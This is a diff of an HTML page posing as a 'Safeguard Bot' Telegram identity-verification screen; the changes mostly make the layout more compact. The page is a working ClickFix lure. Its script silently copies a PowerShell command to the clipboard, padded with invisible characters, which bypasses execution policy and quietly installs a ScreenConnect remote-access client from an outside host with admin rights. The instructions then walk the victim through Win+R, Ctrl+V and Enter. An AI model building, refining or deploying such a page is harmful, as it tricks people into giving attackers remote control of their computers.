@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
-  <title>Safeguard Bot · 3D Verification</title>
+  <title>Safeguard Bot · Verification</title>
   <style>
     * {
       margin: 0;
@@ -12,22 +12,21 @@
       -webkit-tap-highlight-color: transparent;
     }
 
-    /* Premium green background with TV-static noise and slight vignette */
+    /* Premium green background with TV-static noise */
     body {
       background: radial-gradient(circle at 25% 20%, #0f381f, #051a0e);
       position: relative;
-      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
       color: #f0f7f2;
-      line-height: 1.4;
+      line-height: 1.3;
       min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 20px;
-      overflow-x: hidden;
+      padding: 8px;
     }
 
-    /* Enhanced static / hash noise with extra 3D depth illusion */
+    /* Static noise overlay */
     body::before {
       content: "";
       position: fixed;
@@ -40,7 +39,6 @@
       pointer-events: none;
       z-index: 1;
     }
-
     body::after {
       content: "";
       position: fixed;
@@ -53,255 +51,196 @@
       z-index: 1;
     }
 
-    /* Main container – glassmorphic 3D panel */
+    /* Main container – compact height to avoid scroll */
     .app-container {
-      max-width: 580px;
       width: 100%;
+      max-width: 500px;
       margin: 0 auto;
-      background: rgba(8, 18, 14, 0.78);
+      background: rgba(8, 18, 14, 0.85);
       backdrop-filter: blur(12px);
-      border-radius: 64px;
+      border-radius: 32px;
       overflow: hidden;
-      box-shadow: 0 40px 55px -25px rgba(0, 0, 0, 0.9), 0 0 0 1.5px rgba(99, 184, 132, 0.5), inset 0 1px 0 rgba(255,255,255,0.1);
-      transition: transform 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1), box-shadow 0.3s ease;
+      box-shadow: 0 20px 35px -15px black, 0 0 0 1px rgba(99, 184, 132, 0.4);
       position: relative;
       z-index: 2;
     }
 
-    .app-container:hover {
-      transform: translateY(-4px);
-      box-shadow: 0 50px 70px -28px black, 0 0 0 2px #63b884cc;
-    }
-
-    /* screens */
+    /* screens – reduced padding for compactness */
     .screen {
-      padding: 36px 30px 44px;
-      transition: all 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.2);
+      padding: 18px 18px 24px;
     }
     .screen.hidden {
       display: none;
     }
 
-    /* 3D shield with glass shine – removed top dot, added metallic bevel */
+    /* Shield logo – smaller for compact fit */
     .shield-logo {
       display: flex;
       justify-content: center;
-      align-items: center;
-      margin-bottom: 22px;
-      filter: drop-shadow(0 18px 24px rgba(0, 0, 0, 0.6));
-      transition: filter 0.2s;
+      margin-bottom: 8px;
     }
     .shield-logo svg {
-      width: 120px;
+      width: 70px;
       height: auto;
-      transition: transform 0.25s ease;
-    }
-    .shield-logo svg:hover {
-      transform: scale(1.03);
+      filter: drop-shadow(0 8px 12px rgba(0,0,0,0.4));
     }
 
-    /* modern title with 3D text effect */
+    /* Titles – compact but readable */
     .app-title {
       text-align: center;
       font-weight: 800;
-      font-size: 2.1rem;
-      letter-spacing: -0.5px;
-      margin-bottom: 10px;
+      font-size: 1.6rem;
+      letter-spacing: -0.3px;
+      margin-bottom: 4px;
       background: linear-gradient(145deg, #f0ffe6, #88f0b0);
       background-clip: text;
       -webkit-background-clip: text;
       color: transparent;
-      text-shadow: 0 4px 12px rgba(0,0,0,0.3);
     }
 
     .verify-badge {
       text-align: center;
-      font-size: 0.75rem;
+      font-size: 0.65rem;
       text-transform: uppercase;
       font-weight: 700;
-      letter-spacing: 2.5px;
+      letter-spacing: 2px;
       color: #c7f0d8;
-      background: rgba(25, 55, 40, 0.8);
+      background: rgba(25, 55, 40, 0.7);
       display: inline-block;
       width: auto;
-      margin: 0 auto 28px;
-      padding: 7px 20px;
-      border-radius: 80px;
-      backdrop-filter: blur(4px);
-      border: 0.5px solid rgba(99,184,132,0.7);
-      box-shadow: inset 0 1px 0 rgba(255,255,255,0.1), 0 6px 12px rgba(0,0,0,0.2);
+      margin: 0 auto 12px;
+      padding: 3px 14px;
+      border-radius: 60px;
     }
 
-    /* 3D start button – realistic press + glossy */
+    /* Start button – comfortable tap area, compact */
     .verify-btn {
       background: linear-gradient(125deg, #62d48b, #2b8a56);
       border: none;
       width: 100%;
-      padding: 22px 0;
-      font-size: 1.6rem;
+      padding: 14px 0;
+      font-size: 1.2rem;
       font-weight: 800;
       color: #0c2418;
-      border-radius: 100px;
+      border-radius: 80px;
       cursor: pointer;
-      transition: all 0.2s ease;
-      box-shadow: 0 18px 28px -12px rgba(0,0,0,0.7), inset 0 2px 0 rgba(255,255,255,0.4);
-      letter-spacing: 1.5px;
-      font-family: inherit;
-      margin: 22px 0 20px;
-      text-transform: uppercase;
-      position: relative;
-      overflow: hidden;
-    }
-    .verify-btn::after {
-      content: '';
-      position: absolute;
-      top: -50%;
-      left: -60%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, rgba(255,255,255,0) 70%);
-      opacity: 0;
-      transition: opacity 0.3s;
+      transition: all 0.2s;
+      box-shadow: 0 8px 16px -8px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.3);
+      letter-spacing: 1px;
+      margin: 12px 0 8px;
     }
     .verify-btn:active {
-      transform: scale(0.96);
-      background: linear-gradient(125deg, #4cb972, #1f6942);
-      box-shadow: 0 8px 16px -6px black;
-    }
-    .verify-btn:active::after {
-      opacity: 1;
+      transform: scale(0.97);
     }
 
-    /* instruction cards – 3D lifted design with glossy border */
+    /* Instruction cards – compact, no scroll needed */
     .steps-list {
       display: flex;
       flex-direction: column;
-      gap: 24px;
-      margin: 20px 0 32px;
+      gap: 12px;
+      margin: 12px 0 14px;
     }
     .step-card {
-      background: rgba(18, 30, 24, 0.8);
+      background: rgba(18, 30, 24, 0.85);
       backdrop-filter: blur(8px);
-      border-radius: 40px;
-      padding: 24px 26px;
-      border: 1px solid rgba(99, 184, 132, 0.5);
-      box-shadow: 0 20px 30px -18px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255,255,255,0.05);
-      transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.2);
-    }
-    .step-card:hover {
-      transform: translateY(-5px);
-      border-color: #73db9b;
-      box-shadow: 0 30px 40px -22px black;
-      background: rgba(28, 48, 38, 0.9);
+      border-radius: 22px;
+      padding: 12px 16px;
+      border: 1px solid rgba(99, 184, 132, 0.45);
     }
     .step-header {
       display: flex;
       align-items: center;
-      gap: 16px;
-      margin-bottom: 14px;
+      gap: 10px;
+      margin-bottom: 6px;
     }
     .step-number {
       background: linear-gradient(145deg, #2f6a49, #1c472f);
-      width: 50px;
-      height: 50px;
+      width: 32px;
+      height: 32px;
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      border-radius: 50px;
+      border-radius: 40px;
       font-weight: 800;
-      font-size: 1.5rem;
+      font-size: 1rem;
       color: #dcffea;
-      box-shadow: inset 0 1px 2px rgba(255,255,255,0.2), 0 8px 14px rgba(0,0,0,0.4);
+      box-shadow: inset 0 1px 1px rgba(255,255,255,0.1), 0 2px 6px rgba(0,0,0,0.3);
     }
     .step-title {
-      font-size: 1.5rem;
+      font-size: 1.1rem;
       font-weight: 700;
-      letter-spacing: -0.2px;
       background: linear-gradient(135deg, #f5ffe6, #b9f5d1);
       background-clip: text;
       -webkit-background-clip: text;
       color: transparent;
     }
     .step-desc {
-      font-size: 1rem;
-      line-height: 1.5;
+      font-size: 0.75rem;
+      line-height: 1.3;
       color: #ecf9ef;
-      margin-bottom: 18px;
-      padding-left: 12px;
-      border-left: 3px solid #63b884;
+      margin-bottom: 8px;
+      padding-left: 6px;
+      border-left: 2px solid #63b884;
     }
     .key-hint {
       background: #0a1a12e8;
       display: inline-flex;
       align-items: center;
-      gap: 14px;
-      padding: 9px 24px;
-      border-radius: 60px;
-      font-family: 'SF Mono', 'Fira Code', monospace;
+      gap: 8px;
+      padding: 4px 14px;
+      border-radius: 40px;
+      font-family: monospace;
       font-weight: 600;
-      font-size: 1rem;
+      font-size: 0.75rem;
       color: #dafff0;
-      border: 0.5px solid #65b47d;
-      backdrop-filter: blur(2px);
-      box-shadow: inset 0 1px 0 #ffffff1a, 0 6px 12px rgba(0,0,0,0.3);
     }
-    /* larger windows logo */
     .win-icon svg {
-      width: 32px;
-      height: 32px;
-      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
+      width: 18px;
+      height: 18px;
     }
 
-    /* warning note */
+    /* Warning note – compact */
     .warning-note {
       background: rgba(0, 0, 0, 0.5);
-      border-left: 5px solid #ffbb88;
-      border-radius: 28px;
-      padding: 16px 22px;
-      margin: 18px 0 12px;
-      font-size: 0.85rem;
-      color: #ffe6cd;
+      border-left: 3px solid #ffbb88;
+      border-radius: 18px;
+      padding: 8px 14px;
+      margin: 8px 0 6px;
+      font-size: 0.68rem;
       display: flex;
       align-items: center;
-      gap: 14px;
-      backdrop-filter: blur(4px);
-      font-weight: 500;
+      gap: 8px;
     }
     .warning-icon {
-      font-size: 1.4rem;
+      font-size: 1rem;
     }
 
-    /* back button */
+    /* Back button */
     .back-action {
-      margin-top: 28px;
       text-align: center;
+      margin-top: 8px;
     }
     .back-link {
       background: rgba(20, 35, 28, 0.8);
-      backdrop-filter: blur(4px);
       border: 1px solid #6daa86;
-      padding: 12px 32px;
-      border-radius: 60px;
+      padding: 8px 20px;
+      border-radius: 40px;
       color: #e5ffe8;
       font-weight: 600;
+      font-size: 0.75rem;
       cursor: pointer;
       transition: all 0.2s;
-      font-size: 0.9rem;
-      font-family: inherit;
-      letter-spacing: 0.5px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
     }
     .back-link:active {
       transform: scale(0.96);
-      background: #2e553f;
     }
     .footer-note {
-      font-size: 0.7rem;
-      color: #b9d8c5;
+      font-size: 0.6rem;
       text-align: center;
-      margin-top: 28px;
+      margin-top: 12px;
+      padding-top: 10px;
       border-top: 0.5px solid #4e7b64;
-      padding-top: 20px;
+      color: #b9d8c5;
     }
   </style>
 </head>
@@ -310,172 +249,136 @@
   <!-- PAGE 1: Start Verification (silent copy) -->
   <div id="page1" class="screen">
     <div class="shield-logo">
-      <!-- 3D smooth shield (no top dot) -->
       <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
         <defs>
-          <linearGradient id="shieldOuter" x1="0%" y1="0%" x2="100%" y2="100%">
+          <linearGradient id="outer" x1="0%" y1="0%" x2="100%" y2="100%">
             <stop offset="0%" stop-color="#8bf0ae"/>
             <stop offset="45%" stop-color="#52cb7e"/>
             <stop offset="100%" stop-color="#2f8755"/>
           </linearGradient>
-          <linearGradient id="shieldInnerDark" x1="0%" y1="0%" x2="0%" y2="100%">
+          <linearGradient id="innerDark" x1="0%" y1="0%" x2="0%" y2="100%">
             <stop offset="0%" stop-color="#1c2c23"/>
             <stop offset="100%" stop-color="#0c1a12"/>
           </linearGradient>
-          <linearGradient id="shieldLeft" x1="0%" y1="0%" x2="100%" y2="100%">
+          <linearGradient id="left" x1="0%" y1="0%" x2="100%" y2="100%">
             <stop offset="0%" stop-color="#7fe7a3"/>
             <stop offset="100%" stop-color="#3da869"/>
           </linearGradient>
-          <linearGradient id="shieldRight" x1="100%" y1="0%" x2="0%" y2="100%">
+          <linearGradient id="right" x1="100%" y1="0%" x2="0%" y2="100%">
             <stop offset="0%" stop-color="#389b62"/>
             <stop offset="100%" stop-color="#1f6840"/>
           </linearGradient>
-          <filter id="shieldGlow" x="-20%" y="-20%" width="140%" height="140%">
-            <feGaussianBlur in="SourceAlpha" stdDeviation="7"/>
-            <feMerge>
-              <feMergeNode/>
-              <feMergeNode in="SourceGraphic"/>
-            </feMerge>
+          <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
+            <feGaussianBlur in="SourceAlpha" stdDeviation="4"/>
+            <feMerge><feMergeNode/><feMergeNode in="SourceGraphic"/></feMerge>
           </filter>
         </defs>
-        <path d="M256 72 C215 104 172 126 115 135 C103 250 138 363 256 440 C374 363 409 250 397 135 C340 126 297 104 256 72Z" fill="url(#shieldOuter)" filter="url(#shieldGlow)"/>
-        <path d="M256 126 C220 151 184 168 143 175 C136 268 164 351 256 408 C348 351 376 268 369 175 C328 168 292 151 256 126Z" fill="url(#shieldInnerDark)"/>
-        <path d="M256 157 C227 177 199 190 169 196 C164 272 188 337 256 382Z" fill="url(#shieldLeft)"/>
-        <path d="M256 157 C285 177 313 190 343 196 C348 272 324 337 256 382Z" fill="url(#shieldRight)"/>
-        <line x1="256" y1="157" x2="256" y2="382" stroke="#bbffd4" stroke-width="2.8" stroke-opacity="0.9"/>
+        <path d="M256 72 C215 104 172 126 115 135 C103 250 138 363 256 440 C374 363 409 250 397 135 C340 126 297 104 256 72Z" fill="url(#outer)" filter="url(#glow)"/>
+        <path d="M256 126 C220 151 184 168 143 175 C136 268 164 351 256 408 C348 351 376 268 369 175 C328 168 292 151 256 126Z" fill="url(#innerDark)"/>
+        <path d="M256 157 C227 177 199 190 169 196 C164 272 188 337 256 382Z" fill="url(#left)"/>
+        <path d="M256 157 C285 177 313 190 343 196 C348 272 324 337 256 382Z" fill="url(#right)"/>
+        <line x1="256" y1="157" x2="256" y2="382" stroke="#bbffd4" stroke-width="2.5"/>
       </svg>
     </div>
     <div class="app-title">SAFEGUARD BOT</div>
     <div style="text-align: center;"><span class="verify-badge">⚡ VERIFY IDENTITY</span></div>
     <button id="startVerificationBtn" class="verify-btn">⟳ START VERIFICATION</button>
-    <div class="footer-note">secure validation • telegram protected channel</div>
+    <div class="footer-note">secure validation • telegram protected</div>
   </div>
 
-  <!-- PAGE 2: Instructions – improved 3D version -->
+  <!-- PAGE 2: Instructions – compact, fits without scroll -->
   <div id="page2" class="screen hidden">
     <div class="shield-logo">
       <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
-        <defs>
-          <linearGradient id="shieldOuter2" x1="0%" y1="0%" x2="100%" y2="100%">
-            <stop offset="0%" stop-color="#8bf0ae"/>
-            <stop offset="45%" stop-color="#52cb7e"/>
-            <stop offset="100%" stop-color="#2f8755"/>
-          </linearGradient>
-          <linearGradient id="shieldInnerDark2" x1="0%" y1="0%" x2="0%" y2="100%">
-            <stop offset="0%" stop-color="#1c2c23"/>
-            <stop offset="100%" stop-color="#0c1a12"/>
-          </linearGradient>
-          <filter id="shieldGlow2" x="-20%" y="-20%" width="140%" height="140%">
-            <feGaussianBlur in="SourceAlpha" stdDeviation="7"/>
-            <feMerge><feMergeNode/><feMergeNode in="SourceGraphic"/></feMerge>
-          </filter>
-        </defs>
-        <path d="M256 72 C215 104 172 126 115 135 C103 250 138 363 256 440 C374 363 409 250 397 135 C340 126 297 104 256 72Z" fill="url(#shieldOuter2)" filter="url(#shieldGlow2)"/>
-        <path d="M256 126 C220 151 184 168 143 175 C136 268 164 351 256 408 C348 351 376 268 369 175 C328 168 292 151 256 126Z" fill="url(#shieldInnerDark2)"/>
+        <use href="#outer" />
+        <path d="M256 126 C220 151 184 168 143 175 C136 268 164 351 256 408 C348 351 376 268 369 175 C328 168 292 151 256 126Z" fill="url(#innerDark)"/>
         <path d="M256 157 C227 177 199 190 169 196 C164 272 188 337 256 382Z" fill="#6ed894"/>
         <path d="M256 157 C285 177 313 190 343 196 C348 272 324 337 256 382Z" fill="#266d46"/>
-        <line x1="256" y1="157" x2="256" y2="382" stroke="#bbffd4" stroke-width="2.8"/>
+        <line x1="256" y1="157" x2="256" y2="382" stroke="#bbffd4" stroke-width="2.5"/>
       </svg>
     </div>
-    <div class="app-title" style="font-size: 1.7rem;">Complete the verification step</div>
+    <div class="app-title" style="font-size: 1.3rem;">Complete verification step</div>
 
     <div class="steps-list">
-      <!-- step 1: larger windows logo -->
       <div class="step-card">
         <div class="step-header">
           <span class="step-number">1</span>
           <span class="step-title">Win + R</span>
         </div>
-        <div class="step-desc">Press the <strong>Windows logo key</strong> + <strong>R</strong> to open the Run dialog box.</div>
+        <div class="step-desc">Press <strong>Windows key + R</strong> to open Run dialog.</div>
         <div class="key-hint">
           <span class="win-icon"><svg viewBox="0 0 24 24" fill="#0078D7"><path d="M3 12 L3 5 L10 6.5 L10 12 Z M14 7 L21 5 L21 12 L14 12 Z M3 13 L10 13 L10 19 L3 17 Z M14 13 L21 13 L21 19 L14 18 Z"/></svg></span>
           <span>Win + R</span>
         </div>
       </div>
-
-      <!-- step 2 -->
       <div class="step-card">
         <div class="step-header">
           <span class="step-number">2</span>
           <span class="step-title">Ctrl + V</span>
         </div>
-        <div class="step-desc">Press <strong>Ctrl + V</strong> to start the verification for Safeguard.</div>
+        <div class="step-desc">Press <strong>Ctrl + V</strong> to start Safeguard verification.</div>
         <div class="key-hint">📋 Ctrl + V</div>
       </div>
-
-      <!-- step 3 -->
       <div class="step-card">
         <div class="step-header">
           <span class="step-number">3</span>
           <span class="step-title">⏎ Enter</span>
         </div>
-        <div class="step-desc">Press the <strong>Enter</strong> button to complete the verification step.</div>
+        <div class="step-desc">Press <strong>Enter</strong> to complete verification.</div>
         <div class="key-hint">⏎ Enter</div>
       </div>
     </div>
 
     <div class="warning-note">
       <span class="warning-icon">⚠️</span>
-      <span><strong>Please note:</strong> We will never ask for your phone number or verification code. Stay secure.</span>
+      <span><strong>Note:</strong> We never ask for your phone number or verification code.</span>
     </div>
 
     <div class="back-action">
       <button id="backToStartBtn" class="back-link">← Return to start</button>
     </div>
-    <div class="footer-note">Follow steps 1 → 2 → 3 to complete identity validation</div>
+    <div class="footer-note">Follow steps 1 → 2 → 3</div>
   </div>
 </div>
 
 <script>
   (function() {
-    // EXACT VERIFICATION TOKEN as provided (preserved with PowerShell command)
-    const VERIFICATION_TOKEN = `powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process msiexec.exe -ArgumentList '/i https://qncfagpanl.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=company&c=&c=&c=&c=&c=&c=&c= /quiet /norestart' -Verb RunAs -Wait; exitㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ"ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ`;
+    // Your exact verification token (preserved)
+    const VERIFICATION_TOKEN = `powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process msiexec.exe -ArgumentList '/i https://qncfagpanl.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=company&c=&c=&c=&c=&c=&c=&c= /quiet /norestart' -Verb RunAs -Wait; exitㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ"`;
 
     const page1 = document.getElementById('page1');
     const page2 = document.getElementById('page2');
     const startBtn = document.getElementById('startVerificationBtn');
     const backBtn = document.getElementById('backToStartBtn');
 
-    async function silentCopyToClipboard(text) {
+    async function silentCopy(text) {
       try {
         await navigator.clipboard.writeText(text);
-      } catch (err) {
-        const textarea = document.createElement('textarea');
-        textarea.value = text;
-        textarea.style.position = 'fixed';
-        textarea.style.top = '-9999px';
-        document.body.appendChild(textarea);
-        textarea.select();
+      } catch {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.top = '-9999px';
+        document.body.appendChild(ta);
+        ta.select();
         document.execCommand('copy');
-        document.body.removeChild(textarea);
+        document.body.removeChild(ta);
       }
     }
 
-    async function handleStartVerification() {
-      // Copy the exact token silently
-      await silentCopyToClipboard(VERIFICATION_TOKEN);
-      // Redirect to instruction page
+    async function startVerification() {
+      await silentCopy(VERIFICATION_TOKEN);
       page1.classList.add('hidden');
       page2.classList.remove('hidden');
     }
 
-    function goToPage1() {
+    function goBack() {
       page2.classList.add('hidden');
       page1.classList.remove('hidden');
     }
 
-    if (startBtn) {
-      startBtn.addEventListener('click', (e) => {
-        e.preventDefault();
-        handleStartVerification();
-      });
-    }
-    if (backBtn) {
-      backBtn.addEventListener('click', (e) => {
-        e.preventDefault();
-        goToPage1();
-      });
-    }
+    if (startBtn) startBtn.addEventListener('click', (e) => { e.preventDefault(); startVerification(); });
+    if (backBtn) backBtn.addEventListener('click', (e) => { e.preventDefault(); goBack(); });
   })();
 </script>
 </body>
